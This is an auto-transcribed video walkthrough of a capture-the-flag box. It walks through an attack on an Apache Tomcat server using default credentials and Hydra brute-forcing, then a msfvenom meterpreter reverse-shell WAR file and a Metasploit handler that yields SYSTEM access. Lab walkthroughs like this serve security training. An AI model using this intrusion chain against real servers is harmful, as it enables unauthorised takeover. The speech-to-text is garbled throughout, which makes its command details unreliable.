Run Nmap 

we see only one port is open that is port 8080 it is a HTTP service and the banner says it is running Apache Tomcat slash coyote JSP engine Tomcat is essentially just a web server that hosts Java files so let's just go check out what is listening on port 8080 into Firefox and we get this Tomcat welcome splash page so let's click these buttons on the right and just see what happens and the server status brings us to a long and prompt if we do admin/admin we get a actual allowed so we get in to service status with just admin admin and we can see generally things about Tomcat Eden survivor attended this is all Java memory space with the JVM list applications access denied so we can't go to manager HTML lists when we can generally just see information about this server service status not too helpful AJ PAPR this is a proxy for Tomcat but let's try the next app manager app we get access denied right away when trying to go to it we don't me get a login prompt Lets just push this over to burp suite refresh on this access denied refresh this page and we're sending a HTTP request but we have this authorization thing in our header and if we unbasic ste for encode this by going to the decoder tab and then decode as base64 we see its admin : admin because that's how basic HTTP authentication works it just adds this to the header so if we remove our authorization basic click forward go back to a firefox it's asking us for credentials so if we put the username as please subscribe and share my videos click ok going back over to burp suite we have the authorization basic we can copy this go over to decoder paste it in and we see we're trying to authenticate with please subscribe : and share my videos so that's how that whole thing works we just go to Firefox and clear history it should clear this so we no longer have to intercept it so it's turn intercept off click go and yes now it forgot that authorization header so the manager slash HTML page doesn't work with admin admin this whole page or access denied page is saying hey for example you need the manor - GUI role to access this page and here's code to add the user Tomcat with the pass the secret it this is actually the credentials and every now and then you come across people with like just using what the documentation says to set passwords or what the software comes with or even better when you google like how to do something in Stack Overflow you will see sometimes developers just copy and paste from Stack Overflow which includes credentials so this is definitely a very real thing looking at the host manager thing it also asks for login and admin admin doesn't work so if it wasn't default we'd or if it didn't tell us the default we have to find a way to brute-force it so I'm gonna go over to a terminal window I'm gonna pick a good word list to do this with a lot of targeted word list and the sec list wordlist github project i don't know what else to call it on cali its user share sec list and if you don't have this it is on app so just do app to install sec l is TS i believe that is the correct name let's just search for it and yep it's there if you're not on cali if you just go to github sec lists you should see it as the first result so what I'm going to do is find dot to find from the current working directory grep - I'd to do a case-insensitive search I'm just going to search for Tomcat and we find a file passwords default credentials Tomcat better default past list so I'm going to look at this and we see quite a bit of just username : password so I'm going to go over to Hydra so if we do Hydra H and Hydra just a brute force and utility that does a bunch of different protocols so Hydra - H - see the help and we guys see how to specify the username : password so we have - lowercase L for a login name uppercase L is login file lowercase P is password or uppercase P is password file we don't want these because I don't feel like making a username and password file if we go further down the list we have - capital C which is colon separated login colon pass format instead of using - L and - P so that is definitely what we want to do so let's open up button split pane and then do Hydra - capital C and then the location so users share SEC list and then let's grab this string paste this in and then the next thing we have to do is specify what we want to brute force and the very first time I did this I always just try like HTTP colon 10 10 10 95 colon 8080 / - last HTML and you're gonna get a hash cat complain at you because there's no service called HTTP you most likely mean HTTP - git or HTTP - forum - post and you could actually just do HTTP - get colon slash slash and this is going to work so we get it said admin admin worked and tomcat secret worked and while on manager HTML and i'm an admin certainly does not work host manager manager HTML manager status so manager slash HTML I'm not sure what Hydra was thinking so in that case we can go back to Hydra help and see how to set a proxy so we can do hydro proxy HTTP so let's set this variable and then we specify web burp is listening so HTTP colon slash slash 127 0 0 1 port 8080 run this again but go over into burp and our HTTP history I guess I have Google running and we did a bunch of requests there I'm not sure why that happened so we can see Hydra trying to brute force and we can see that just because the authorization is changing so if we go here go to decoder paste this in root password one go over here copy this good repeater are not repeated decoder bases in root root so we get a bunch of authorization denied so what I'm going to do is change this filter term by let's see is there take out for xx request error there we go goodbye host and we see we're left with only two that are successful and both of these two say basic and this looks like Tomcat Tom secret we give it to coda Tomcat secret so let's go back over here it's doing admin admin so let's F go - N and then base 64 and let's see we actually I do admin : admin copy this go here turner HTTP air is on search by term and I think this one's actually a pro feature to search by to him I'm not possible positive there but here's the requests that are using admin admin and we can see the response for three forbidden for three forbidden so I have no idea why Hydra is saying admin admin works there but here's the correct credentials and to backtrack a little bit the correct way to do this because this does work but I believe the better way to do this is not to specify all this because when you do this I don't know how to do arguments so if you had to do like a login form htb - PO it's not gonna be that simple so how I generally like using this is let's just delete all this you do - s to specify the port and - s I think it stands for a source port maybe I don't know but - s is port it doesn't do - P because - P is for password and then you want to specify the IP address I think is that IP address then service or service than IP I'll try IP so 10 10 10 95 HTTP - get and then after that you can specify your options like slash manager slash HTML and there we go I think this is the better way to specify it just because it's going to work for you all the time because when you do HTTP - post you put your arguments right here um if you also wanted to see everything that's going on you can do - lowercase V uppercase v and we can see what it's trying to login as so you can see the failed attempts - so let's see yeah it still thinks admin admin works there there's gonna be something silly I did there but that is slash manager slash HTML and let's clear everything so we're not saying that authorization header and then admin certainly does not work so I'm not sure what hydras thinking let's do Tomcat then s3c ret and we get access to this tomcat web application manager if you look around this page you'll notice there's a deploy option to deploy a war file you need to play one locator on a server or just brow upload one from your computer and then applications these are uploaded war files a war file is essentially just a packaged up Java code or a JSP so we can go to like examples click on P examples and click execute here and we can see this basic math JSP file click on source and we can see the source code to that showing it wasn't just printing that table it was actually doing math inside of that table if we go back to you can look at all the ones like hello world result hello rolled looking at the source code to this one you can see it doing a JSP way to do that so you know if you can upload a word get that here and then have that actually execute bad code you could potentially get a shell so the tool I know one we use to do this is MSF venom because it just all generates Metasploit payloads really easily so we can do MSM venom - h4 help and then we want to do - L payloads to list all the potential payloads we can use it's going take a few seconds to run and we'll see various payloads I want to know if it's Windows 32 or 64-bit so i keeps going down i see the OS architecture - AMD 64 which means we're dealing with a 64-bit box so i'm going to use a 64 bit payload and I'm just gonna do Windows x64 meterpreter or is reverse tcp if you see the matura underscore reverse tcp that means it's a I think it's called stage list source you always get stage lists in stage make stop and contains all of motor Peter so this payload is going to be a little bit bigger if it's just meterpreter slash then it's a stage payload which means it's just a small stub that you give the server and the server calls back to you and you give it the rest of the code the benefit to that is your payloads are much smaller so if you're doing like buffer overflows they can fit in more places the downside to that is it's a lot easier to make signatures for that type of activity because in order to do that we just downloading code off the web server then executing it chances are you're creating like a read write execute memory space on your box and that doesn't happen that often normally happens when people are doing bad things so if antivirus looks at that it'll see that this is actually hard to read so I'm just going to know the payload will do - be Windows x64 meterpreter reverse underscore TCP and the other thing we need is a format we need to know how to get it to run generate a war file so I'll do - L and then the other things I can do with - L is payloads and kodos nops platforms rx formats so we'll do formats and see where the word is it is right here and if we keep going up we'll see framework executable format so - - format war will generate this a war file so let's try this let's do msi venom - P and then the payload we want which is Windows x64 meterpreter verse TCP we have to specify the variables so LHOST and Lport is going to be 9001 this is just telling the payload where to call back - f4 format we want 4 then - Oh out file would do please subscribe or generate this and we see we do have the file created if we change this to be meterpreter underscore reverse TCP and do please subscribe to dot war we'll see how big this file is and compare these staged and staged list payloads so we see let's just put this in more human readable so one is 4 kilobytes the other is a hundred and twelve kilobytes because again when you do that underscore not the slash you're doing all of meterpreter with just the slash you're just saying hey go here and download so this is much smaller than this before we can upload this though we have to have a way to catch the shell and send it meterpreter so we're going to use MSF DB space run a lot of people start Metasploit with just MSF console but MSF DB space run will start the database and then start Metasploit for you and I'm not sure what persistent cameras are nope so nothing so um yeah so I always just use MSF DB space run so I want to do like service Postgres start them MSF console because if you have the database running everything searches super fast so you can just do search exploit and I guess my cache is built so it returns within a few seconds but I didn't have the database running it may take a good 30 45 seconds for that to run so in order to set up the handler to catch this we want to do use what is it it's multi hammer I forget what's before it search multi hammer is it exploit multi handler yep so use exploit multi hammer then set payload we want Windows x64 meterpreter reverse tcp because that's the war file we're going to use set L host to ton zero this is gonna be what we're listening on always just do it twice because sometimes when you set L host it doesn't actually set and I found doing it twice makes it work a little bit more often then set out port 9001 exploit - J to run this and then send handlers meterpreter sessions to the background so now we have a war file that we can upload and we also have Metasploit listening so when we execute that war file we'll get a shell back so let's go back over to Tomcat and we're going to upload a file and then see if we get a shell click browse go to root htb boxes Jerry please subscribe click deploy and then do we have a show yet nope let's go click on a please subscribe application please subscribe is not available 404 refresh don't get a shell let's just go look at one thing make their temp CD tab unzip stop that slash please subscribe dot war and we want to go to this JSP I'm not sure if emissive mmm said it or anything but essentially war files are just zips so I can unzip the work get the contents of the file and I'm going to specify it manually it must be a better way to do this because I don't expect them to force you to do this every time but we keep this JSP we don't get 404 and we can go over here and we see meterpreter session 1 has been opened so if we do sessions - i to interact 1 we're here and we can do help and look at it is there like sis info here system commands execute we can do like get you idea to get what we're running as so get UID well ND authority system so we're already on this box we can go to shell users administrator desktop and then go into flags and we can get birthday user and root flag here so that's essentially how to do the Box the easy 
